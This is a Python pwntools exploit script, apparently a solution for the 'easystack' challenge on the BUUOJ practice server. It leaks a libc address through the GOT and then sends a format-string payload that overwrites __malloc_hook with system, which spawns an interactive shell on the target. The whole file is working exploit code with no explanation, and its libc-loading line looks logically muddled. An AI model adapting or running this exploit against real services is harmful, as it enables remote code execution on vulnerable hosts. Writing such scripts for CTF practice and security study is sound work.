#!/usr/bin/env python3
#coding:utf-8

from pwn import *

#--------------------prepare------------------------
binary = './easystack_fixed'
libc_so = ""
host = "node4.buuoj.cn"
port = 10001
#---------------------------------------------------
elf = ELF(binary, checksec=False)
libc = ELF(libc_so, checksec=False) if libc_so and not elf.got else (not elf.got or elf.libc)
context(arch = elf.arch, os = 'linux')
if args.G:
    context.log_level = 'debug'
p = remote(host, port) if args.R else process(binary)

def attach(msg = ''):
    if args.R:return
    context(terminal=["tmux","splitw","-v"])
    gdb.attach(p, gdbscript=msg)
    dbg('go to gdb')
#---------------------short command-------------------
dbg = lambda msg='debug': info(f'[*]{msg}') if args.R else input(f"pid: {pidof(p)[0]} =>{msg}")
checkstr = lambda data:data if isinstance(data, bytes) else data.encode()
sl = lambda data: p.sendline(checkstr(data))
sd = lambda data: p.send(checkstr(data))
sa = lambda delimit, data: p.sendafter(checkstr(delimit), checkstr(data))
sla = lambda delimit, data: p.sendlineafter(checkstr(delimit), checkstr(data))
ru = lambda delimit, *args, **kwargs: p.recvuntil(checkstr(delimit), *args, **kwargs)
rl = lambda : p.recvline()
ra = lambda timeout=10 : p.recvall(timeout=timeout)
rcn = lambda number=4096,*args, **kwargs: p.recv(number,*args, **kwargs)
ss = lambda delimit, data: success(f'{delimit}: {data:#x}')
uu64 = lambda data:u64(checkstr(data).ljust(8, p8(0)))
uu32 = lambda data:u32(checkstr(data).ljust(4, p8(0)))
#---------------------PWN SPACE----------------------

sla('Which address you wanna read:\n', str(elf.got.puts))
puts_addr = int(rl().strip(), 16)

libc_base = puts_addr - libc.sym.puts
ss('libc base', libc_base)
ss('puts address', puts_addr)

system_addr = libc_base +libc.sym.system
malloc_hook = libc_base + libc.sym.__malloc_hook
ss('malloc_hook', malloc_hook)
ss('system address', system_addr)
bss_addr = elf.bss()


one = [0xc9bbb, 0x14482b, 0x14482c]
#attach()#__vfprintf_internal+2781
payload = flat(fmtstr_payload(7, {malloc_hook: system_addr, bss_addr: b'sh;\x00'}), f'%{bss_addr-0x20}c')

sla('Good Bye\n', payload)

#--------INTERACTIVE----------------------------
p.interactive()
